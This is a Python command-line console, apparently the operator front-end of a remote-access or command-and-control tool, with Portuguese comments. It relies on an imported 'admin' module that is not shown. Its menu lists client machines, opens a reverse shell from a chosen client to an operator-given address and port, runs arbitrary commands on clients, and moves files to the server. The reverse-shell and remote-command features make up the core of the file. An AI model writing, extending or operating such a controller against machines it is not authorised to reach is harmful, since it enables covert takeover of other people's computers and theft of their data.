#!/usr/bin/python3
from front import admin
import os


stayInProgram=True
res=False
commands = ['help','listClients','popShell','runComand', 'testServer', 'testClient','sendFile2Server','exit']

exit = len(commands) - 1

master=admin()

while stayInProgram :
    wait = True
    i=0
    print("List of commands:\n\n")
    while (i < len(commands) ):
        print (str(i) + " - " + commands[i])
        i+=1
    command = exit;

    try : 
        command = int(input('Enter the number of command:'))
        if (command<0) or (command>exit):
            raise command
    except:
        print("The input is not validated\n")
        command = exit


    print ("The command selected is: " + commands[command])

    if (command == 0): #help
        print (
        "\n\nThe program is an administrator of several computers that act as clients of the server where that program is run."  + "\n\n" +
        "0 - help: describe the program and the commands of program " "\n\n" +
        "1 - listClients: list full clients." + "\n\n" + 
        "2 - popShell: runs a reverse shell." + "\n\n" + 
        "3 - runComand: run a command on the client machine."  + "\n\n" +
        "4 - testServer: tests the connection to the server."  + "\n\n" +
        "5 - testClient: tests the connection on the client machine."  + "\n\n" +
        "6 - sendFile2Server: send file to server."  + "\n\n" +
        "7 - exit: disconnects of the server."  + "\n"
    )

    elif (command == 1): #listClients
        try:
            if not (master.displayClients()):
               raise Exception("server not find")
        except Exception as e:
            print(e)

    
    elif (command == 2): #popShell
        try:
            if not (master.displayClients()):
                raise Exception("server not find")

            client = int(input("What client?"))
            print("\n")
            addres = input("what address?")
            print("\n")
            port = int(input("What port?"))
            print("\n")

            if not (master.abrirShell(client,addres,port)):
                raise Exception("server not find")
        except Exception as e:
            print(e)


    elif (command == 3): #runComand
        try:
            if not (master.displayClients()):
                raise Exception("server not find")
            
            client = int(input("What client?"))
            print("\n")
            comd = input("what command?")
            print("\n")

            if not (master.runCommand(comd,client)):
                raise Exception("server not find")
        except Exception as e:
            print(e)
    
    elif (command == 4): #testServer
        try:
            if not(master.testServer()):
                raise Exception("server not find")
        except Exception as e:
            print(e)
    
    elif (command == 5): #testClient
        try:
            if not (master.displayClients()):
                raise Exception("server not find")
            
            client = int(input("What client?"))
            print("\n")

            if not(master.testClient(client)):
                raise Exception("server not find")

        except Exception as e:
            print(e)
    
    elif (command == 6): #sendFile2Server
        try:
            os.system("ls -l | grep -v \"drw\" | awk '{print $9}'")
            lFile = input("\nWhat file? ")
            if not(master.localFile(lFile)):
                raise  Exception("file not find")


            if not(master.sendFile2Server(lFile)):
                raise Exception("server not find")

        except Exception as e:
            print(e)

    elif (command == exit): #exit
        stayInProgram = False
        wait = False
    
    else : #comando não descrito, nao deveria acontecer
        stayInProgram = False
        wait = False

    if (wait):
        input("\nPress enter for the next command")
        wait = False
    else:
        print("Finish the program")

#{listClients:ok,popShell:ok,execProgram:no,runComand:ok,testServer:ok,testeClient:ok}
#lC:ok,pS:ok,eP:n,rC:ok,tS:ok,tC:ok

#falta apenas senha para o adm e enviar e receber arquivos